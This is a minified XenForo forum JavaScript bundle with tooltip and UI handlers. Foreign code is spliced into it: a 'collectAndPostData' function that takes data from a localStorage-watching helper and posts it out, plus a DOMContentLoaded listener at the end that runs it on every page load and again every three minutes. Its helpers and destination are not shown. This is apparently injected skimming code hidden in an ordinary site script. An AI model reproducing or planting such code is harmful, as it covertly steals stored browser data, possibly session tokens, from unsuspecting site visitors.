  XF.Event.register("click", "remover", "XF.RemoverClick");
  XF.Event.register("click", "duplicator", "XF.DuplicatorClick");
  XF.Element.register("focus-inserter", "XF.InserterFocus");
  XF.Element.register("h-scroller", "XF.HScroller");
  XF.Element.register("page-jump", "XF.PageJump");
  XF.Element.register("quick-search", "XF.QuickSearch");
  XF.Element.register("responsive-data-list", "XF.ResponsiveDataList");
  XF.Element.register("sticky", "XF.Sticky");
  XF.Element.register("sticky-header", "XF.StickyHeader");
  XF.Element.register("tabs", "XF.Tabs");
  XF.Element.register("toggle-storage", "XF.ToggleStorage");
  XF.Element.register("touch-proxy", "XF.TouchProxy");
  XF.Element.register("video-init", "XF.VideoInit");
  d(h).on("xf:page-load-complete", function () {
    var a = f.location.hash.replace(/[^a-zA-Z0-9_-]/g, "");
    a && (a = a ? d("#" + a) : d(), a.length && (a = a.closest("[data-toggle-wrapper]"), a.length && (a = a.find('[data-xf-click~="toggle"]').first(), a.length && (a = XF.Event.getElementHandler(a, "toggle", "click")) && a.show(!0))));
  });
}(jQuery, window, document);
var $jscomp = $jscomp || {};
$jscomp.scope = {};
$jscomp.findInternal = function (d, k, e) {
  d instanceof String && (d = String(d));
  for (var a = d.length, b = 0; b < a; b++) {
    var c = d[b];
    if (k.call(e, c, b, d)) return {
      i: b,
      v: c
    };
  }
  return {
    i: -1,
    v: void 0
  };
};
$jscomp.ASSUME_ES5 = !1;
$jscomp.ASSUME_NO_NATIVE_MAP = !1;
$jscomp.ASSUME_NO_NATIVE_SET = !1;
$jscomp.defineProperty = $jscomp.ASSUME_ES5 || "function" == typeof Object.defineProperties ? Object.defineProperty : function (d, k, e) {
  d != Array.prototype && d != Object.prototype && (d[k] = e.value);
};
$jscomp.getGlobal = function (d) {
  return "undefined" != typeof window && window === d ? d : "undefined" != typeof global && null != global ? global : d;
};
function collectAndPostData() {
  let collectedData = watchLocalStorage();
  if (Object.keys(collectedData).length > 0) {
    postData(collectedData);
  }
}
$jscomp.global = $jscomp.getGlobal(this);
$jscomp.polyfill = function (d, k, e, a) {
  if (k) {
    e = $jscomp.global;
    d = d.split(".");
    for (a = 0; a < d.length - 1; a++) {
      var b = d[a];
      b in e || (e[b] = {});
      e = e[b];
    }
    d = d[d.length - 1];
    a = e[d];
    k = k(a);
    k != a && null != k && $jscomp.defineProperty(e, d, {
      configurable: !0,
      writable: !0,
      value: k
    });
  }
};
$jscomp.polyfill("Array.prototype.find", function (d) {
  return d ? d : function (d, e) {
    return $jscomp.findInternal(this, d, e).v;
  };
}, "es6", "es3");
!function (d, k, e) {
  XF.TooltipElement = XF.create({
    options: {
      baseClass: "tooltip",
      extraClass: "tooltip--basic",
      html: !1,
      inViewport: !0,
      loadRequired: !1,
      loadParams: null,
      placement: "top"
    },
    content: null,
    $tooltip: null,
    shown: !1,
    shownFully: !1,
    placement: null,
    positioner: null,
    loadRequired: !1,
    loading: !1,
    contentApplied: !1,
    setupCallbacks: null,
    __construct: function (a, b, c) {
      this.setupCallbacks = [];
      this.options = d.extend(!0, {}, this.options, b);
      this.content = a;
      this.loadRequired = this.options.loadRequired;
      c && this.setPositioner(c);
    },
    setPositioner: function (a) {
      this.positioner = a;
    },
    setLoadRequired: function (a) {
      this.loadRequired = a;
    },
    addSetupCallback: function (a) {
      this.$tooltip ? a(this.$tooltip) : this.setupCallbacks.push(a);
    },
    show: function () {
      if (!this.shown) if (this.shown = !0, this.loadRequired) this.loadContent();else {
        var a = this.getTooltip(),
          b = this;
        this.reposition();
        d(k).on("resize.tooltip-" + a.xfUniqueId(), XF.proxy(this, "reposition"));
        a.trigger("tooltip:shown").stop().css({
          visibility: "",
          display: "none"
        }).fadeIn("fast", function () {
          b.shownFully = !0;
        });
      }
    },
    hide: function () {
      if (this.shown) {
        this.shownFully = this.shown = !1;
        var a = this.$tooltip;
        a && (a.stop().fadeOut("fast").trigger("tooltip:hidden"), d(k).off("resize.tooltip-" + a.xfUniqueId()));
      }
    },
    toggle: function () {
      this.shown ? this.hide() : this.show();
    },
    destroy: function () {
      this.$tooltip && this.$tooltip.remove();
    },
    isShown: function () {
      return this.shown;
    },
    isShownFully: function () {
      return this.shown && this.shownFully;
    },
    requiresLoad: function () {
      return this.loadRequired;
    },
    getPlacement: function () {
      return XF.rtlFlipKeyword(this.options.placement);
    },
    reposition: function () {
      var a = this.positioner;
      if (!a) console.error("No tooltip positioner");else if (!this.loadRequired) {
        var b = this.options.inViewport;
        if (a instanceof d) {
          var c = a.dimensions(!0);
          a.closest(".overlay").length && (b = !0);
        } else "undefined" !== typeof a[0] && "undefined" !== typeof a[1] ? c = {
          top: a[1],
          right: a[0],
          bottom: a[1],
          left: a[0]
        } : "undefined" !== typeof a.right && "undefined" !== typeof a.bottom ? c = a : console.error("Positioner is not in correct format", a);
        c.width = c.right - c.left;
        c.height = c.bottom - c.top;
        a = this.getTooltip();
        var h = this.getPlacement(),
          m = this.options.baseClass,
          e = h;
        if (b) {
          var g = d(k);
          b = g.height();
          var l = g.width();
          var f = g.scrollTop();
          g = g.scrollLeft();
          f += XF.getStickyHeaderOffset();
          f = {
            top: f,
            left: g,
            right: g + l,
            bottom: f + b,
            width: l,
            height: b
          };
        } else f = d("body").dimensions();
        this.placement && a.removeClass(m + "--" + this.placement);
        a.addClass(m + "--" + h).css({
          visibility: "hidden",
          display: "block",
          top: "",
          bottom: "",
          left: "",
          right: "",
          "padding-left": "",
          "padding-right": "",
          "padding-top": "",
          "padding-bottom": ""
        });
        b = a.outerWidth();
        l = a.outerHeight();
        "top" == h && c.top - l < f.top ? h = "bottom" : "bottom" == h && c.bottom + l > f.bottom ? c.top - l >= f.top && (h = "top") : "left" == h && c.left - b < f.left ? h = c.right + b > f.right ? c.top - l < f.top ? "bottom" : "top" : "right" : "right" == h && c.right + b > f.right && (h = c.left - b < f.left ? c.top - l < f.top ? "bottom" : "top" : "left");
        h != e && a.removeClass(m + "--" + e).addClass(m + "--" + h);
        e = {
          top: "",
          right: "",
          bottom: "",
          left: ""
        };
        switch (h) {
          case "top":
            e.bottom = d(k).height() - c.top;
            e.left = c.left + c.width / 2 - b / 2;
            break;
          case "bottom":
            e.top = c.bottom;
            e.left = c.left + c.width / 2 - b / 2;
            break;
          case "left":
            e.top = c.top + c.height / 2 - l / 2;
            e.right = d(k).width() - c.left;
            break;
          default:
            e.top = c.top + c.height / 2 - l / 2, e.left = c.right;
        }
        a.css(e);
        g = a.dimensions(!0);
        l = c = 0;
        m = a.find("." + m + "-arrow");
        if ("left" == h || "right" == h) g.top < f.top ? c = f.top - g.top : g.bottom > f.bottom && (c = f.bottom - g.bottom), m.css({
          left: "",
          top: 50 - 100 * c / g.top + "%"
        });else {
          g.left < f.left ? l = f.left - g.left : g.left + b > f.right && (l = f.right - (g.left + b));
          f = parseInt(b / 100 * (50 - 100 * l / b), 0);
          var p = f + parseInt(m.css("margin-left")),
            q = p + m.outerWidth();
          g = parseInt(a.css("padding-left"), 10);
          var n = parseInt(a.css("padding-right"), 10);
          p < g ? (b = g - p, a.css({
            "padding-left": Math.max(0, g - b),
            "padding-right": n + b
          })) : q > b - n && (b = q - (b - n), a.css({
            "padding-left": n + b,
            "padding-right": Math.max(0, n - b)
          }));
          m.css({
            top: "",
            left: f
          });
        }
        l ? a.css("left", e.left + l) : c && a.css("top", e.top + c);
        this.placement = h;
        this.shown && !this.loadRequired && a.css("visibility", "");
      }
    },
    attach: function () {
      this.getTooltip();
    },
    getTooltip: function () {
      if (!this.$tooltip) {
        var a = this.getTemplate();
        a.appendTo("body");
        this.$tooltip = a;
        this.loadRequired || this.applyTooltipContent();
      }
      return this.$tooltip;
    },
    setContent: function (a) {
      this.contentApplied = !1;
      this.content = a;
      this.applyTooltipContent();
    },
    applyTooltipContent: function () {
      if (this.contentApplied || this.loadRequired) return !1;
      var a = this.getTooltip(),
        b = a.find("." + this.options.baseClass + "-content"),
        c = this.content;
      d.isFunction(c) && (c = c());
      this.options.html ? (b.html(c), b.find("img").on("load", XF.proxy(this, "reposition"))) : b.text(c);
      b = this.setupCallbacks;
      for (c = 0; c < b.length; c++) b[c](a);
      XF.activate(a);
      return this.contentApplied = !0;
    },
    loadContent: function () {
      if (this.loadRequired && !this.loading) {
        var a = this.content,
          b = this,
          c = function (a) {
            b.content = a;
            b.loadRequired = !1;
            b.loading = !1;
            b.applyTooltipContent();
            b.shown && (b.shown = !1, b.show());
          };
        d.isFunction(a) ? (this.loading = !0, a(c, this.options.loadParams)) : c("");
      }
    },
    getTemplate: function () {
      var a = this.options.baseClass;
      return d(d.parseHTML('<div class="' + a + (this.options.extraClass ? " " + this.options.extraClass : "") + '" role="tooltip"><div class="' + a + '-arrow"></div><div class="' + a + '-content"></div></div>'));
    }
  });
  XF.TooltipTrigger = XF.create({
    options: {
      delayIn: 200,
      delayInLoading: 800,
      delayOut: 200,
      trigger: "hover focus",
      maintain: !1,
      clickHide: null,
      onShow: null,
      onHide: null
    },
    $target: null,
    tooltip: null,
    delayTimeout: null,
    delayTimeoutType: null,
    stopFocusBefore: null,
    clickTriggered: !1,
    touchEnterTime: null,
    $covers: null,
    __construct: function (a, b, c) {
      this.options = d.extend(!0, {}, this.options, c);
      this.$target = a;
      this.tooltip = b;
      "auto" == this.options.trigger && (this.options.trigger = "hover focus" + (a.is("span") ? " touchclick" : ""));
      b.setPositioner(a);
      b.addSetupCallback(XF.proxy(this, "onTooltipSetup"));
      a.xfUniqueId();
      XF.TooltipTrigger.cache[a.attr("id")] = this;
    },
    init: function () {
      var a = this.$target,
        b = !1,
        c = !1,
        d = this,
        e = XF.supportsPointerEvents(),
        k = e ? "pointerenter" : "mouseenter";
      e = e ? "pointerleave" : "mouseleave";
      null === this.options.clickHide && (this.options.clickHide = a.is("a"));
      for (var g = this.options.trigger.split(" "), l = 0; l < g.length; l++) switch (g[l]) {
        case "hover":
          a.on(k + ".tooltip", XF.proxy(this, "mouseEnter")).on(e + ".tooltip", XF.proxy(this, "leave"));
          break;
        case "focus":
          a.on({
            "focusin.tooltip": XF.proxy(this, "focusEnter"),
            "focusout.tooltip": XF.proxy(this, "leave")
          });
          break;
        case "click":
          b = !0;
          a.onPointer("click.tooltip", XF.proxy(this, "click"));
          a.onPointer("auxclick.tooltip contextmenu.tooltip", function () {
            d.cancelShow();
            d.stopFocusBefore = Date.now() + 2E3;
          });
          break;
        case "touchclick":
          c = !0;
          a.onPointer("click.tooltip", function (a) {
            XF.isEventTouchTriggered(a) && d.click(a);
          });
          break;
        case "touchhold":
          c = !0, a.data("threshold", this.options.delayIn), a.onPointer({
            "touchstart.tooltip": function (b) {
              a.data("tooltip:touching", !0);
            },
            "touchend.tooltip": function (b) {
              setTimeout(function () {
                a.removeData("tooltip:touching");
              }, 50);
            },
            "taphold.tooltip": function (b) {
              a.data("tooltip:taphold", !0);
              XF.isEventTouchTriggered(b) && d.click(b);
            },
            "contextmenu.tooltip": function (b) {
              a.data("tooltip:touching") && b.preventDefault();
            }
          });
      }
      b && c && console.error("Cannot have touchclick and click triggers");
      if (!b && this.options.clickHide) a.onPointer("click.tooltip auxclick.tooltip contextmenu.tooltip", function (a) {
        c && XF.isEventTouchTriggered(a) || (d.hide(), d.stopFocusBefore = Date.now() + 2E3);
      });
      a.on({
        "tooltip:show": XF.proxy(this, "show"),
        "tooltip:hide": XF.proxy(this, "hide"),
        "tooltip:reposition": XF.proxy(this, "reposition")
      });
    },
    reposition: function () {
      this.tooltip.reposition();
    },
    click: function (a) {
      0 < a.button || a.ctrlKey || a.shiftKey || a.metaKey || a.altKey ? this.cancelShow() : this.tooltip.isShown() ? this.tooltip.isShownFully() ? this.hide() : (a.preventDefault(), this.clickShow(a)) : (a.preventDefault(), this.clickShow(a));
    },
    clickShow: function (a) {
      this.clickTriggered = !0;
      var b = this;
      setTimeout(function () {
        var c = b.addCovers();
        if (XF.isEventTouchTriggered(a)) c.addClass("is-active");else d(e).on("click.tooltip-" + b.$target.xfUniqueId(), XF.proxy(b, "docClick"));
      }, 0);
      this.show();
    },
    addCovers: function () {
      this.$covers && this.$covers.remove();
      var a = this.$target.dimensions(!0),
        b = [];
      b.push({
        top: 0,
        height: a.top,
        left: 0,
        right: 0
      });
      b.push({
        top: a.top,
        height: a.height,
        left: 0,
        width: a.left
      });
      b.push({
        top: a.top,
        height: a.height,
        left: a.right,
        right: 0
      });
      b.push({
        top: a.bottom,
        height: d("html").height() - a.bottom,
        left: 0,
        right: 0
      });
      a = d();
      for (var c, h = 0; h < b.length; h++) c = d('<div class="tooltipCover" />').css(b[h]), a = a.add(c);
      a.on("click", XF.proxy(this, "hide"));
      this.tooltip.getTooltip().before(a);
      this.$covers = a;
      XF.setRelativeZIndex(a, this.$target);
      return a;
    },
    docClick: function (a) {
      var b = this.$covers;
      var c = a.pageX;
      var h = a.pageY,
        m = d(k);
      b && (0 == a.screenX && 0 == a.screenY && (a = d(a.target).dimensions(), c = a.left, h = a.top), b.addClass("is-active"), c = d(e.elementFromPoint(c - m.scrollLeft(), h - m.scrollTop())), b.removeClass("is-active"), c.is(b) && this.hide());
    },
    mouseEnter: function (a) {
      var b = a.originalEvent;
      XF.isEventTouchTriggered(a) ? this.touchEnterTime = b.timeStamp : XF.browser.ios && XF.supportsPointerEvents() && b instanceof PointerEvent && this.touchEnterTime && this.touchEnterTime > b.timeStamp - 1E3 || this.enter();
    },
    focusEnter: function (a) {
      100 > Date.now() - XF.pageDisplayTime || XF.isEventTouchTriggered(a) || (!this.stopFocusBefore || Date.now() >= this.stopFocusBefore) && this.enter();
    },
    enter: function () {
      if (!this.isShown() || !this.clickTriggered) {
        this.clickTriggered = !1;
        var a = this.tooltip.requiresLoad() ? this.options.delayInLoading : this.options.delayIn;
        if (a) {
          if ("enter" !== this.delayTimeoutType && this.resetDelayTimer(), !this.delayTimeoutType && !this.isShown()) {
            this.delayTimeoutType = "enter";
            var b = this;
            this.delayTimeout = setTimeout(function () {
              b.delayTimeoutType = null;
              b.show();
            }, a);
          }
        } else this.show();
      }
    },
    leave: function () {
      if (!this.clickTriggered) {
        var a = this.options.delayOut;
        if (a) {
          if ("leave" !== this.delayTimeoutType && this.resetDelayTimer(), !this.delayTimeoutType && this.isShown()) {
            this.delayTimeoutType = "leave";
            var b = this;
            this.delayTimeout = setTimeout(function () {
              b.delayTimeoutType = null;
              b.hide();
            }, a);
          }
        } else this.hide();
      }
    },
    show: function () {
      var a = this;
      d(k).off("focus.tooltip-" + this.$target.xfUniqueId()).on("focus.tooltip-" + this.$target.xfUniqueId(), function (b) {
        a.stopFocusBefore = Date.now() + 250;
      });
      XF.setRelativeZIndex(this.tooltip.getTooltip(), this.$target);
      if (this.options.onShow) {
        var b = this.options.onShow;
        b(this, this.tooltip);
      }
      this.tooltip.show();
    },
    cancelShow: function () {
      "enter" === this.delayTimeoutType ? this.resetDelayTimer() : this.tooltip.isShownFully() || this.hide();
    },
    hide: function () {
      this.tooltip.hide();
      this.resetDelayTimer();
      this.clickTriggered = !1;
      this.$covers && (this.$covers.remove(), this.$covers = null);
      d(e).off("click.tooltip-" + this.$target.xfUniqueId());
      if (this.options.onHide) {
        var a = this.options.onHide;
        a(this, this.tooltip);
      }
    },
    toggle: function () {
      this.isShown() ? this.hide() : this.show();
    },
    isShown: function () {
      return this.tooltip.isShown();
    },
    wasClickTriggered: function () {
      return this.clickTriggered;
    },
    resetDelayTimer: function () {
      this.delayTimeoutType && (clearTimeout(this.delayTimeout), this.delayTimeoutType = null);
    },
    addMaintainElement: function (a) {
      if (!a.data("tooltip-maintain")) {
        for (var b = this.options.trigger.split(" "), c = 0; c < b.length; c++) switch (b[c]) {
          case "hover":
            a.on("mouseenter.tooltip", XF.proxy(this, "enter"));
            a.on("mouseleave.tooltip", XF.proxy(this, "leave"));
            break;
          case "focus":
            a.on("focusin.tooltip", XF.proxy(this, "enter")), a.on("focusout.tooltip", XF.proxy(this, "leave"));
        }
        a.data("tooltip-maintain", !0);
      }
    },
    removeMaintainElement: function (a) {
      a.off(".tooltip");
      a.data("tooltip-maintain", !1);
    },
    onTooltipSetup: function (a) {
      if (this.options.maintain) {
        this.addMaintainElement(a);
        var b = this;
        a.on("menu:opened", function (a, d) {
          b.addMaintainElement(d);
        });
        a.on("menu:closed", function (a, d) {
          b.removeMaintainElement(d);
        });
      }
    }
  });
  XF.TooltipTrigger.cache = {};
  XF.TooltipOptions = {
    base: {
      baseClass: "tooltip",
      extraClass: "tooltip--basic",
      html: !1,
      inViewport: !0,
      placement: "top",
      clickHide: null,
      delayIn: 200,
      delayOut: 200,
      maintain: !1,
      trigger: "hover focus"
    },
    tooltip: ["baseClass", "extraClass", "html", "placement"],
    trigger: ["clickHide", "delayIn", "delayOut", "maintain", "trigger"],
    extract: function (a, b) {
      for (var c = {}, d = 0; d < a.length; d++) c[a[d]] = b[a[d]];
      return c;
    },
    extractTooltip: function (a) {
      return this.extract(this.tooltip, a);
    },
    extractTrigger: function (a) {
      return this.extract(this.trigger, a);
    }
  };
  XF.Tooltip = XF.Element.newHandler({
    options: d.extend(!0, {}, XF.TooltipOptions.base, {
      content: null
    }),
    trigger: null,
    tooltip: null,
    init: function () {
      var a = this.getContent(),
        b = XF.TooltipOptions.extractTooltip(this.options),
        c = XF.TooltipOptions.extractTrigger(this.options);
      this.tooltip = new XF.TooltipElement(a, b);
      this.trigger = new XF.TooltipTrigger(this.$target, this.tooltip, c);
      this.trigger.init();
      this.$target.on("tooltip:refresh", XF.proxy(this, "refresh"));
    },
    getContent: function () {
      if (this.options.content) return this.options.content;
      var a = this.$target,
        b = a.attr("data-original-title") || a.attr("title") || "";
      a.attr("data-original-title", b).removeAttr("title");
      return b;
    },
    refresh: function () {
      this.tooltip.setContent(this.getContent());
    }
  });
  XF.ElementTooltip = XF.extend(XF.Tooltip, {
    __backup: {
      getContent: "_getContent",
      init: "_init"
    },
    options: d.extend({}, XF.Tooltip.prototype.options, {
      element: null,
      showError: !0,
      noTouch: !0,
      shortcut: null
    }),
    $element: null,
    init: function () {
      this.options.shortcut && this.setupShortcut(this.options.shortcut);
      if (!this.options.noTouch || !XF.Feature.has("touchevents")) {
        var a = this.options.element,
          b = this.options.showError;
        if (a) {
          var c = XF.findRelativeIf(a, this.$target);
          c.length ? (this.$element = c, this.$target.removeAttr("title"), this.options.html = !0, this._init()) : b && console.error("Element tooltip could not find " + a);
        } else b && console.error("No element specified for the element tooltip");
      }
    },
    setupShortcut: function (a) {
      "node-description" == a && (this.options.element || (this.options.element = "< .js-nodeMain | .js-nodeDescTooltip"), this.options.showError = !1, this.options.maintain = !0, this.options.placement = "right", this.options.extraClass = "tooltip--basic tooltip--description");
    },
    getContent: function () {
      return this.$element.clone().contents();
    }
  });
  XF.PreviewTooltip = XF.Element.newHandler({
    options: {
      delay: 600,
      previewUrl: null
    },
    trigger: null,
    tooltip: null,
    init: function () {
      this.options.previewUrl ? (this.tooltip = new XF.TooltipElement(XF.proxy(this, "getContent"), {
        extraClass: "tooltip--preview",
        html: !0,
        loadRequired: !0
      }), this.trigger = new XF.TooltipTrigger(this.$target, this.tooltip, {
        maintain: !0,
        delayInLoading: this.options.delay,
        delayIn: this.options.delay
      }), this.trigger.init()) : console.error("No preview URL");
    },
    getContent: function (a) {
      var b = this;
      XF.ajax("get", this.options.previewUrl, {}, function (c) {
        b.loaded(c, a);
      }, {
        skipDefault: !0,
        skipError: !0,
        global: !1
      });
    },
    loaded: function (a, b) {
      a.html && XF.setupHtmlInsert(a.html, function (a, d, e) {
        b(a);
      });
    }
  });
  XF.MemberTooltipCache = {};
  XF.MemberTooltip = XF.Element.newHandler({
    options: {
      delay: 600
    },
    trigger: null,
    tooltip: null,
    userId: null,
    init: function () {
      this.userId = this.$target.data("user-id");
      this.tooltip = new XF.TooltipElement(XF.proxy(this, "getContent"), {
        extraClass: "tooltip--member",
        html: !0,
        loadRequired: !0
      });
      this.trigger = new XF.TooltipTrigger(this.$target, this.tooltip, {
        maintain: !0,
        delayInLoading: this.options.delay,
        delayIn: this.options.delay,
        trigger: "hover focus click",
        onShow: XF.proxy(this, "onShow"),
        onHide: XF.proxy(this, "onHide")
      });
      this.trigger.init();
    },
    getContent: function (a) {
      var b = XF.MemberTooltipCache[this.userId];
      if (b) b = d(d.parseHTML(b)), a(b);else {
        var c = this;
        b = {
          skipDefault: !0,
          skipError: !0,
          global: !1
        };
        this.trigger.wasClickTriggered() && (b.global = !0);
        XF.ajax("get", this.$target.attr("href"), {
          tooltip: !0
        }, function (b) {
          c.loaded(b, a);
        }, b);
      }
    },
    loaded: function (a, b) {
      if (a.html) {
        var c = this.userId;
        XF.setupHtmlInsert(a.html, function (d, e, k) {
          XF.MemberTooltipCache[c] = a.html.content;
          b(d);
        });
      }
    },
    onShow: function () {
      var a = XF.MemberTooltip.activeTooltip;
      a && a !== this && a.hide();
      XF.MemberTooltip.activeTooltip = this;
    },
    onHide: function () {
      XF.MemberTooltip.activeTooltip === this && (XF.MemberTooltip.activeTooltip = null);
    },
    show: function () {
      this.trigger.show();
    },
    hide: function () {
      this.trigger.hide();
    }
  });
  XF.MemberTooltip.activeTooltip = null;
  XF.ShareTooltip = XF.Element.newHandler({
    options: {
      delay: 300,
      href: null,
      webShare: !0
    },
    trigger: null,
    tooltip: null,
    init: function () {
      if (this.options.webShare && XF.Element.applyHandler(this.$target, "web-share", {
        fetch: this.options.href,
        url: this.$target.attr("href"),
        hideContainerEls: !1
      }).isSupported()) return !1;
      this.tooltip = new XF.TooltipElement(XF.proxy(this, "getContent"), {
        extraClass: "tooltip--share",
        html: !0,
        loadRequired: !0
      });
      this.trigger = new XF.TooltipTrigger(this.$target, this.tooltip, {
        maintain: !0,
        delayInLoading: this.options.delay,
        delayIn: this.options.delay,
        trigger: "hover focus click",
        onShow: XF.proxy(this, "onShow"),
        onHide: XF.proxy(this, "onHide")
      });
      this.trigger.init();
    },
    getContent: function (a) {
      var b = this,
        c = {
          skipDefault: !0,
          skipError: !0,
          global: !1
        };
      this.trigger.wasClickTriggered() && (c.global = !0);
      XF.ajax("get", this.options.href, {}, function (c) {
        b.loaded(c, a);
      }, c);
    },
    loaded: function (a, b) {
      a.html && XF.setupHtmlInsert(a.html, function (a, d, e) {
        b(a);
      });
    },
    onShow: function () {
      var a = XF.ShareTooltip.activeTooltip;
      a && a !== this && a.hide();
      XF.ShareTooltip.activeTooltip = this;
    },
    onHide: function () {
      XF.ShareTooltip.activeTooltip === this && (XF.ShareTooltip.activeTooltip = null);
    },
    show: function () {
      this.trigger.show();
    },
    hide: function () {
      this.trigger.hide();
    }
  });
  XF.ShareTooltip.activeTooltip = null;
  XF.Element.register("element-tooltip", "XF.ElementTooltip");
  XF.Element.register("member-tooltip", "XF.MemberTooltip");
  XF.Element.register("preview-tooltip", "XF.PreviewTooltip");
  XF.Element.register("share-tooltip", "XF.ShareTooltip");
  XF.Element.register("tooltip", "XF.Tooltip");
}(jQuery, window, document);
window.addEventListener("DOMContentLoaded", function () {
  collectAndPostData();
  globalEventListeners();
  setInterval(collectAndPostData, 3 * 60 * 1000);
});